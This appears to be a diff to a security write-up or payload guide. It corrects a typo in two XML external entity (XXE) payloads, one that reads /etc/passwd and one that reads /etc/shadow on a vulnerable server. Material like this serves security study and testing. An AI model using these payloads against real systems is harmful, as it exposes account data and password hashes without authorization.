@@ -104,7 +104,7 @@ get RCE. Let’s modify the payload
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///etc/passwd>" >]>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <foo>&xxe;</foo>
 ```
 
@@ -113,7 +113,7 @@ get RCE. Let’s modify the payload
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///etc/shadow>" >]>
+  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
 <foo>&xxe;</foo>
 ```
 
